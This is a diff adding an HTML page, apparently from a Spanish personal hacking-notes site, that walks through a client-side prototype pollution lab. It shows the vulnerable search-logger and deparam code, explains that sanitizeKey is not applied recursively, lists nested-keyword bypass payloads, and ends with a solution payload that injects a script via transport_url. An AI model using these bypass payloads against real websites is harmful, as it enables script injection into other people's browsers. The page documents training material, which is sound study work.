@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>M0B notes</title>
+  <meta name="description" content="&lt;p&gt;searchLoggerFiltered.js&lt;/p&gt;">
+  <link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link rel="icon" href="/M0B.png" type="image/png">
+  <style>
+    /* fallback si la hoja no carga */
+    body{background:#000;color:#e6e6e6;font:16px/1.7 ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace}
+  </style>
+  
+  <script defer src="/assets/js/copy-code.js"></script>
+</head>
+<body>
+  <header class="site-header">
+    <div class="site-brand">
+      <img class="brand-logo" src="/M0B.png" alt="logo" />
+      <div class="brand-title">M0B notes</div>
+    </div>
+    <nav class="site-nav">
+      <a href="/">Inicio</a>
+      <a href="/puertos/">Puertos</a>
+      <a href="/escalada/">Escalada</a>
+      <a href="/portswigger/">Portswigger</a>
+      <a href="/hackthebox/">HackTheBox</a>
+      <a href="/real_life/">Real Life</a>
+      <a href="/extras/">Extras</a>
+    </nav>
+  </header>
+
+  <main>
+    <div class="container">
+      <p>searchLoggerFiltered.js</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="kd">function</span> <span class="nf">logQuery</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">try</span> <span class="p">{</span>
+        <span class="k">await</span> <span class="nf">fetch</span><span class="p">(</span><span class="nx">url</span><span class="p">,</span> <span class="p">{</span><span class="na">method</span><span class="p">:</span> <span class="dl">"</span><span class="s2">post</span><span class="dl">"</span><span class="p">,</span> <span class="na">keepalive</span><span class="p">:</span> <span class="kc">true</span><span class="p">,</span> <span class="na">body</span><span class="p">:</span> <span class="nx">JSON</span><span class="p">.</span><span class="nf">stringify</span><span class="p">(</span><span class="nx">params</span><span class="p">)});</span>
+    <span class="p">}</span> <span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">console</span><span class="p">.</span><span class="nf">error</span><span class="p">(</span><span class="dl">"</span><span class="s2">Failed storing query</span><span class="dl">"</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="k">async</span> <span class="kd">function</span> <span class="nf">searchLogger</span><span class="p">()</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">config</span> <span class="o">=</span> <span class="p">{</span><span class="na">params</span><span class="p">:</span> <span class="nf">deparam</span><span class="p">(</span><span class="k">new</span> <span class="nc">URL</span><span class="p">(</span><span class="nx">location</span><span class="p">).</span><span class="nx">searchParams</span><span class="p">.</span><span class="nf">toString</span><span class="p">())};</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">transport_url</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">let</span> <span class="nx">script</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nf">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">script</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nx">script</span><span class="p">.</span><span class="nx">src</span> <span class="o">=</span> <span class="nx">config</span><span class="p">.</span><span class="nx">transport_url</span><span class="p">;</span>
+        <span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nf">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">if</span><span class="p">(</span><span class="nx">config</span><span class="p">.</span><span class="nx">params</span> <span class="o">&amp;&amp;</span> <span class="nx">config</span><span class="p">.</span><span class="nx">params</span><span class="p">.</span><span class="nx">search</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">await</span> <span class="nf">logQuery</span><span class="p">(</span><span class="dl">'</span><span class="s1">/logger</span><span class="dl">'</span><span class="p">,</span> <span class="nx">config</span><span class="p">.</span><span class="nx">params</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="kd">function</span> <span class="nf">sanitizeKey</span><span class="p">(</span><span class="nx">key</span><span class="p">)</span> <span class="p">{</span>
+    <span class="kd">let</span> <span class="nx">badProperties</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">constructor</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">__proto__</span><span class="dl">'</span><span class="p">,</span><span class="dl">'</span><span class="s1">prototype</span><span class="dl">'</span><span class="p">];</span>
+    <span class="k">for</span><span class="p">(</span><span class="kd">let</span> <span class="nx">badProperty</span> <span class="k">of</span> <span class="nx">badProperties</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">key</span> <span class="o">=</span> <span class="nx">key</span><span class="p">.</span><span class="nf">replaceAll</span><span class="p">(</span><span class="nx">badProperty</span><span class="p">,</span> <span class="dl">''</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">return</span> <span class="nx">key</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="nb">window</span><span class="p">.</span><span class="nf">addEventListener</span><span class="p">(</span><span class="dl">"</span><span class="s2">load</span><span class="dl">"</span><span class="p">,</span> <span class="nx">searchLogger</span><span class="p">);</span>
+</code></pre></div></div>
+
+<p>deparamSanitised.js</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">var</span> <span class="nx">deparam</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span> <span class="nx">params</span><span class="p">,</span> <span class="nx">coerce</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="kd">var</span> <span class="nx">obj</span> <span class="o">=</span> <span class="p">{},</span>
+        <span class="nx">coerce_types</span> <span class="o">=</span> <span class="p">{</span> <span class="dl">'</span><span class="s1">true</span><span class="dl">'</span><span class="p">:</span> <span class="o">!</span><span class="mi">0</span><span class="p">,</span> <span class="dl">'</span><span class="s1">false</span><span class="dl">'</span><span class="p">:</span> <span class="o">!</span><span class="mi">1</span><span class="p">,</span> <span class="dl">'</span><span class="s1">null</span><span class="dl">'</span><span class="p">:</span> <span class="kc">null</span> <span class="p">};</span>
+
+    <span class="k">if </span><span class="p">(</span><span class="o">!</span><span class="nx">params</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">return</span> <span class="nx">obj</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nx">params</span><span class="p">.</span><span class="nf">replace</span><span class="p">(</span><span class="sr">/</span><span class="se">\+</span><span class="sr">/g</span><span class="p">,</span> <span class="dl">'</span><span class="s1"> </span><span class="dl">'</span><span class="p">).</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">&amp;</span><span class="dl">'</span><span class="p">).</span><span class="nf">forEach</span><span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">v</span><span class="p">){</span>
+        <span class="kd">var</span> <span class="nx">param</span> <span class="o">=</span> <span class="nx">v</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span> <span class="dl">'</span><span class="s1">=</span><span class="dl">'</span> <span class="p">),</span>
+            <span class="nx">key</span> <span class="o">=</span> <span class="nf">decodeURIComponent</span><span class="p">(</span> <span class="nx">param</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">),</span>
+            <span class="nx">val</span><span class="p">,</span>
+            <span class="nx">cur</span> <span class="o">=</span> <span class="nx">obj</span><span class="p">,</span>
+            <span class="nx">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+
+            <span class="nx">keys</span> <span class="o">=</span> <span class="nx">key</span><span class="p">.</span><span class="nf">split</span><span class="p">(</span> <span class="dl">'</span><span class="s1">][</span><span class="dl">'</span> <span class="p">),</span>
+            <span class="nx">keys_last</span> <span class="o">=</span> <span class="nx">keys</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+
+        <span class="k">if </span><span class="p">(</span> <span class="sr">/</span><span class="se">\[</span><span class="sr">/</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span> <span class="nx">keys</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="sr">/</span><span class="se">\]</span><span class="sr">$/</span><span class="p">.</span><span class="nf">test</span><span class="p">(</span> <span class="nx">keys</span><span class="p">[</span> <span class="nx">keys_last</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="nx">keys</span><span class="p">[</span> <span class="nx">keys_last</span> <span class="p">]</span> <span class="o">=</span> <span class="nx">keys</span><span class="p">[</span> <span class="nx">keys_last</span> <span class="p">].</span><span class="nf">replace</span><span class="p">(</span> <span class="sr">/</span><span class="se">\]</span><span class="sr">$/</span><span class="p">,</span> <span class="dl">''</span> <span class="p">);</span>
+
+            <span class="nx">keys</span> <span class="o">=</span> <span class="nx">keys</span><span class="p">.</span><span class="nf">shift</span><span class="p">().</span><span class="nf">split</span><span class="p">(</span><span class="dl">'</span><span class="s1">[</span><span class="dl">'</span><span class="p">).</span><span class="nf">concat</span><span class="p">(</span> <span class="nx">keys</span> <span class="p">);</span>
+
+            <span class="nx">keys_last</span> <span class="o">=</span> <span class="nx">keys</span><span class="p">.</span><span class="nx">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">keys_last</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="k">if </span><span class="p">(</span> <span class="nx">param</span><span class="p">.</span><span class="nx">length</span> <span class="o">===</span> <span class="mi">2</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="nx">val</span> <span class="o">=</span> <span class="nf">decodeURIComponent</span><span class="p">(</span> <span class="nx">param</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span>
+
+            <span class="k">if </span><span class="p">(</span> <span class="nx">coerce</span> <span class="p">)</span> <span class="p">{</span>
+                <span class="nx">val</span> <span class="o">=</span> <span class="nx">val</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nf">isNaN</span><span class="p">(</span><span class="nx">val</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="p">((</span><span class="o">+</span><span class="nx">val</span> <span class="o">+</span> <span class="dl">''</span><span class="p">)</span> <span class="o">===</span> <span class="nx">val</span><span class="p">)</span> <span class="p">?</span> <span class="o">+</span><span class="nx">val</span>        <span class="c1">// number</span>
+                    <span class="p">:</span> <span class="nx">val</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">undefined</span><span class="dl">'</span>                       <span class="p">?</span> <span class="kc">undefined</span>         <span class="c1">// undefined</span>
+                        <span class="p">:</span> <span class="nx">coerce_types</span><span class="p">[</span><span class="nx">val</span><span class="p">]</span> <span class="o">!==</span> <span class="kc">undefined</span>           <span class="p">?</span> <span class="nx">coerce_types</span><span class="p">[</span><span class="nx">val</span><span class="p">]</span> <span class="c1">// true, false, null</span>
+                            <span class="p">:</span> <span class="nx">val</span><span class="p">;</span>                                                          <span class="c1">// string</span>
+            <span class="p">}</span>
+
+            <span class="k">if </span><span class="p">(</span> <span class="nx">keys_last</span> <span class="p">)</span> <span class="p">{</span>
+                <span class="k">for </span><span class="p">(</span> <span class="p">;</span> <span class="nx">i</span> <span class="o">&lt;=</span> <span class="nx">keys_last</span><span class="p">;</span> <span class="nx">i</span><span class="o">++</span> <span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">key</span> <span class="o">=</span> <span class="nx">keys</span><span class="p">[</span><span class="nx">i</span><span class="p">]</span> <span class="o">===</span> <span class="dl">''</span> <span class="p">?</span> <span class="nx">cur</span><span class="p">.</span><span class="nx">length</span> <span class="p">:</span> <span class="nx">keys</span><span class="p">[</span><span class="nx">i</span><span class="p">];</span>
+                    <span class="nx">cur</span> <span class="o">=</span> <span class="nx">cur</span><span class="p">[</span><span class="nf">sanitizeKey</span><span class="p">(</span><span class="nx">key</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">i</span> <span class="o">&lt;</span> <span class="nx">keys_last</span>
+                        <span class="p">?</span> <span class="nx">cur</span><span class="p">[</span><span class="nf">sanitizeKey</span><span class="p">(</span><span class="nx">key</span><span class="p">)]</span> <span class="o">||</span> <span class="p">(</span> <span class="nx">keys</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">&amp;&amp;</span> <span class="nf">isNaN</span><span class="p">(</span> <span class="nx">keys</span><span class="p">[</span><span class="nx">i</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span> <span class="p">?</span> <span class="p">{}</span> <span class="p">:</span> <span class="p">[]</span> <span class="p">)</span>
+                        <span class="p">:</span> <span class="nx">val</span><span class="p">;</span>
+                <span class="p">}</span>
+
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                <span class="k">if </span><span class="p">(</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">toString</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="p">)</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">[object Array]</span><span class="dl">'</span> <span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">obj</span><span class="p">[</span><span class="nf">sanitizeKey</span><span class="p">(</span><span class="nx">key</span><span class="p">)].</span><span class="nf">push</span><span class="p">(</span> <span class="nx">val</span> <span class="p">);</span>
+
+                <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span> <span class="p">{}.</span><span class="nx">hasOwnProperty</span><span class="p">.</span><span class="nf">call</span><span class="p">(</span><span class="nx">obj</span><span class="p">,</span> <span class="nx">key</span><span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">obj</span><span class="p">[</span><span class="nf">sanitizeKey</span><span class="p">(</span><span class="nx">key</span><span class="p">)]</span> <span class="o">=</span> <span class="p">[</span> <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">],</span> <span class="nx">val</span> <span class="p">];</span>
+
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nx">obj</span><span class="p">[</span><span class="nf">sanitizeKey</span><span class="p">(</span><span class="nx">key</span><span class="p">)]</span> <span class="o">=</span> <span class="nx">val</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+
+        <span class="p">}</span> <span class="k">else</span> <span class="k">if </span><span class="p">(</span> <span class="nx">key</span> <span class="p">)</span> <span class="p">{</span>
+            <span class="nx">obj</span><span class="p">[</span><span class="nx">key</span><span class="p">]</span> <span class="o">=</span> <span class="nx">coerce</span>
+                <span class="p">?</span> <span class="kc">undefined</span>
+                <span class="p">:</span> <span class="dl">''</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">});</span>
+
+    <span class="k">return</span> <span class="nx">obj</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?__proto__.foo=bar
+/?__proto__[foo]=bar 
+/?constructor.prototype.foo=bar
+</code></pre></div></div>
+
+<p>Como sanitizeKey no se hace recursivo :</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/?__pro__proto__to__[foo]=bar
+/?__pro__proto__to__.foo=bar
+/?constconstructorructor[protoprototypetype][foo]=bar
+/?constconstructorructor.protoprototypetype.foo=bar
+</code></pre></div></div>
+
+<p>Solución:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?__pro__proto__to__[transport_url]=data:,alert(1);
+</code></pre></div></div>
+
+      <div class="footer">
+        <span class="muted">© 2025 · Generado con Jekyll</span>
+      </div>
+    </div>
+  </main>
+</body>
+</html>
+
